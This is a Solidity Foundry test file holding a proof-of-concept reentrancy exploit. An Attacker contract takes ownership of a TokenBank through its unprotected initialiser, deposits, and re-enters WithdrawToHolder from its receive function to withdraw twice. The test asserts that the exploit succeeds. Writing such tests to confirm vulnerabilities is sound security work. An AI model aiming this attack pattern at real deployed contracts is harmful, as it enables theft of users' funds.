
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1.1 ether && attackVal < 100 ether);
        
        // Ensure attackVal is even to avoid rounding issues during the split withdrawal
        attackVal = (attackVal / 2) * 2;

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Become owner to access WithdrawToHolder
        _victim.initTokenBank();
        // Deposit funds to pass the Holders check
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // Initiate the withdrawal. We withdraw half the amount.
        // The reentrancy will withdraw the second half.
        // This proves reentrancy without causing an underflow revert in Solidity 0.8+.
        _victim.WithdrawToHolder(address(this), val / 2);
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the contract to withdraw the second half before the first balance update occurs
            _victim.WithdrawToHolder(address(this), storedAttackVal / 2);
        } else {
            // If we reached here, we successfully re-entered
            exploitSucceeded = true;
        }
    }
}
